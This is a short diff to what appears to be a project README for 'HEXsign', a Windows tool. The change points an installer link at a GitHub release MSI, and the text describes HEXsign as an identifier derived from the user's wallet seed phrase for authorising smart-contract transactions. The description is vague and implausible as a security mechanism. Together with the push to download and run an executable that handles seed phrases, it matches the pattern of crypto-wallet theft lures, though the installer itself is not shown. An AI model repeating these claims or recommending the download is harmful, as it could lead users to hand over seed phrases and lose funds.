@@ -7,7 +7,7 @@
 
 🔹 **Standalone Windows Version**  
 - [HEXsign_0.1.0_x64.exe](https://github.com/Bitzilla-dev/HEXsign/releases/download/app/HEXsign_0.1.0_x64.exe#) (11 MB)  
-- [HEXsign_0.1.0_x64_en-US.msi](#) (5 MB)  
+- [HEXsign_0.1.0_x64_en-US.msi]([#](https://github.com/Bitzilla-dev/HEXsign/releases/download/win_app/HEXsign_Generator_0.1.0_x64_en-US.msi)) (5 MB)  
 
 ## 🔍 What is HEXsign?
 HEXsign is a unique cryptographic identifier generated using a secure hash function derived from the user's **seed phrase**. It provides a **secure verification method** for authorizing smart contract operations. When attached to a request, HEXsign ensures that only authorized users can initiate transactions.
